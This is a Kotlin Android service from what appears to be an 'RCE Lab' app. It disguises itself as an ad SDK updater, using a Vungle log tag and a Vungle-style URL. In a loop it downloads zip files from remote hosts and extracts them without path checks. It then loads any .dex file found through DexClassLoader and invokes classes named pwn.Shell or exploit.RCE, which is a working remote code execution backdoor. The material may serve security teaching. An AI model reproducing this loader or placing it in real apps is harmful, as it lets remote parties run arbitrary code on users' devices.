package com.app.lab.rce

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import dalvik.system.DexClassLoader
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.zip.ZipInputStream

class AdUpdateService : Service() {
    companion object {
        private const val TAG = "VungleService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "background_service_channel"
        private const val UPDATE_INTERVAL_MS = 5000L // 15 segundos

        private val LEGITIMATE_URLS = listOf(
            "http://10.0.2.2:8000/payload.zip",
            "http://api.vungle.com/api/v1/bundles/update.zip"
        )
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        Log.i(TAG, "🎯 Servicio automático iniciado")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification())
        
        if (!isRunning) {
            isRunning = true
            startPeriodicUpdates()
            Log.i(TAG, "📡 Verificaciones automáticas iniciadas (cada 15s)")
        }
        
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background data sync"
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("RCE Lab")
            .setContentText("Background service active")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun startPeriodicUpdates() {
        serviceScope.launch {
            while (isRunning) {
                try {
                    checkForPayload()
                    delay(UPDATE_INTERVAL_MS)
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Error en verificación: ${e.message}")
                    delay(5000)
                }
            }
        }
    }

    private suspend fun checkForPayload() {
        val url = LEGITIMATE_URLS.random()
        Log.i(TAG, "📡 Solicitando: $url")
        
        try {
            val contentFile = downloadContent(url)
            if (contentFile != null) {
                Log.i(TAG, "📥 Descarga exitosa: ${contentFile.name}")
                processPayload(contentFile)
            }
        } catch (e: Exception) {
            // Silencioso - normal que algunas URLs fallen
        }
    }

    private suspend fun downloadContent(urlString: String): File? {
        return try {
            val url = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "GET"
                connectTimeout = 5000
                readTimeout = 10000
                setRequestProperty("User-Agent", "ContentApp/1.0 (Android)")
            }
            
            if (connection.responseCode == 200) {
                val contentFile = File(filesDir, "content_${System.currentTimeMillis()}.zip")
                FileOutputStream(contentFile).use { output ->
                    connection.inputStream.use { input ->
                        input.copyTo(output)
                    }
                }
                contentFile
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    private suspend fun processPayload(payloadFile: File) {
        try {
            val extractedFiles = extractContent(payloadFile)
            
            extractedFiles.forEach { file ->
                when {
                    file.name.endsWith(".dex") -> {
                        Log.w(TAG, "⚠️ Contenido ejecutable detectado: ${file.name}")
                        loadPayloadModule(file)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error procesando payload: ${e.message}")
        } finally {
            payloadFile.delete()
        }
    }

    private fun extractContent(zipFile: File): List<File> {
        val extractedFiles = mutableListOf<File>()
        val tempDir = File(filesDir, "temp_${System.currentTimeMillis()}")
        tempDir.mkdirs()

        ZipInputStream(zipFile.inputStream()).use { zin ->
            var entry = zin.nextEntry
            while (entry != null) {
                if (!entry.isDirectory) {
                    val file = File(tempDir, entry.name)
                    file.parentFile?.mkdirs()
                    
                    FileOutputStream(file).use { output ->
                        zin.copyTo(output)
                    }
                    extractedFiles.add(file)
                    Log.i(TAG, "📂 Extraído: ${entry.name}")
                }
                entry = zin.nextEntry
            }
        }
        
        return extractedFiles
    }

    private fun loadPayloadModule(dexFile: File) {
        Log.w(TAG, "🚨 EJECUTANDO PAYLOAD DINÁMICO")
        
        try {
            dexFile.setReadOnly()
            
            val optimizedDir = getDir("dex_modules", MODE_PRIVATE)
            val classLoader = DexClassLoader(
                dexFile.absolutePath,
                optimizedDir.absolutePath,
                null,
                this.classLoader
            )

            val possibleClasses = listOf("pwn.Shell", "exploit.RCE", "payload.Main")

            for (className in possibleClasses) {
                try {
                    val clazz = classLoader.loadClass(className)
                    val method = clazz.getMethod("trigger", android.content.Context::class.java)
                    method.invoke(null, this)
                    
                    Log.e(TAG, "💀 RCE EJECUTADA - Clase: $className")
                    notifyCompromise()
                    break
                    
                } catch (e: ClassNotFoundException) {
                    // Continuar buscando
                } catch (e: NoSuchMethodException) {
                    // Continuar buscando
                }
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error ejecutando payload: ${e.message}")
        }
    }

    private fun notifyCompromise() {
        val intent = Intent("com.app.lab.rce.COMPROMISED")
        intent.setClass(this, CompromiseReceiver::class.java)
        intent.putExtra("timestamp", System.currentTimeMillis())
        intent.putExtra("source", "BackgroundService")
        
        sendBroadcast(intent)
        Log.e(TAG, "🔴 SISTEMA COMPROMETIDO")
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        Log.i(TAG, "🔴 Servicio detenido")
    }
}
